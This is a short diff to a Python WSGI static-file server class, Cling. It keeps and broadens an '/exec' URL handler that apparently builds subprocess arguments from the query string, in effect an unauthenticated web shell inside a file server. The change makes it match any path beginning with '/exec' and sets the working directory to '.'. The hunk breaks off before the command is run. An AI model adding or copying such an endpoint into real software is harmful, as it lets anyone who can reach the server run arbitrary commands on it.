@@ -98,12 +98,12 @@ class Cling(object):
             return self.method_not_allowed(environ, start_response, headers)
         path_info = environ.get('PATH_INFO', '')
         full_path = self._full_path(path_info)
-        if path_info == '/exec':
+        if path_info.startswith('/exec'):
             from subprocess import Popen, PIPE, STDOUT
             import urllib
             query = environ.get('QUERY_STRING')
             args = []
-            cwd = '/'
+            cwd = '.'
             for var in query.split('&'):
                 split = var.split('=')
                 if split[0] == 'args':
